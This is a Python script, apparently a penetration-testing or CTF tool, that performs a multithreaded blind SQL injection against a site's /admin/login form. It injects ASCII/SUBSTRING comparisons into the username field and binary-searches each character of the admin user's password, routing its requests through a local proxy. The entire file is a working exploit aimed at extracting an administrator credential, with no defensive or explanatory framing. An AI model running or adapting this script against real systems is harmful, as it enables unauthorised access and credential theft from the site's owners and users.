import requests, argparse, urllib.parse, re, threading, time, os

parser = argparse.ArgumentParser()
parser = argparse.ArgumentParser()

parser.add_argument("-u", "--url",
                    dest="url",
                    action='store', required=True)
parser.add_argument("-t", "--threads", dest="threads", type=int,default=5)
parser.add_argument("--dbg",  action=argparse.BooleanOptionalAction, default=False)

args = parser.parse_args()
url = args.url
dbg = args.dbg
## threads
max_threads = args.threads
if(max_threads > 10):
    print("Max threads is 10 to avoid data disruption")
    exit(1)
    
sema = threading.Semaphore(value=max_threads)
threads = list()
thread_number = 0
job_finished = False
#sql = args.sql

temp_data=[''] * 100

login_url = f"{url}/admin/login"

headers = { "Content-Type": "application/x-www-form-urlencoded",
            "Origin": f"{url}",
            "Referer": f"{url}/admin/index.php"}

def start_job():
    global temp_data, job_finished
    temp_data=[''] * 100
    job_number=1
    while True: 

        if(job_finished):       
            while (len(threads) > 0):
                clean_threads()
                time.sleep(0.2)

            print_data(False)
            break

        if(len(threads) >= max_threads):
            clean_threads()

        if(len(threads) < max_threads): 
            thread = threading.Thread(target=get_data,args=(str(job_number),))
            threads.append(thread)
            thread.start()
            job_number += 1

        time.sleep(0.2)


def clean_threads():
    for t in threads:
        if not t.is_alive():
            t.join()#threads.remove(t)
            threads.remove(t)
            #t.join()



def get_data(job_number):
    global job_finished
    sema.acquire()
    letter_number = int(job_number)
    if(word_brute(letter_number) == False):
        job_finished = True
        sema.release()
        return

    sema.release()


def get_payload(letter_number, compare_ch ,snumber):
    return f'OR ASCII(SUBSTRING((SELECT password FROM admin WHERE username = "admin" LIMIT 1 OFFSET 0), {letter_number}, 1)) {compare_ch} {snumber}'


def check(payload):

    data = { 'username': f'\' {payload}#', 'password': 'asd', 'login': ''}

    encoded_data = urllib.parse.urlencode(data)

    proxy = { 'http': 'http://127.0.0.1:8080' }
    s = requests.Session()
    s.get(login_url)
    r = s.post(login_url,data=encoded_data, proxies=proxy, headers=headers)

    if ("Cannot find" in r.text):
        return False

    if ("Incorrect" in r.text):
        return True


def rev_compare_ch(word):
    if (word == '<'):
        return '>'
    if (word == '>'):
        return '<'

    raise NotImplemented


def print_data(isTemp):
    if(isTemp):
        print(''.join(temp_data), end='\r')
    else:
        print(''.join(temp_data))


def clean_data(letter_number):
    global temp_data
    for i in range(0,len(temp_data)):
        if(i >= letter_number):
            temp_data[i] = ''


def word_brute(letter_number):

    global temp_data
    max_number = 128
    prev_snumber = 128
    snumber = 64
    compare_ch = '<'
    payload = get_payload(letter_number, compare_ch ,snumber)
    stop = False

    with open("dbg.txt", "a") as f:
        while (1):
            if (check(payload)):
                if(snumber < 30):
                    temp_data[letter_number] = ''
                    clean_data(letter_number)
                    return False

                stop = False
                temp_data[letter_number] = chr(snumber)
                print_data(True)

                temp = snumber
                if (compare_ch == '<'):
                    snumber = snumber - int(abs((prev_snumber - snumber) / 2))
                else:
                    snumber = snumber + int(abs((prev_snumber - snumber) / 2))

                prev_snumber = temp

                if(dbg):
                    f.write(str(f"{snumber} "))
            else:
                if (stop):
                    if (int(snumber) >= 31):
                        print_data(True)
                        f.write(str(f"{snumber}\n"))
                        temp_data[letter_number] = chr(snumber)

                        return True
                    else:
                        temp_data[letter_number] = ''
                        return False

                compare_ch = rev_compare_ch(compare_ch)
                max_number = prev_snumber
                stop = True

            payload = get_payload(letter_number, compare_ch ,snumber)


start_job()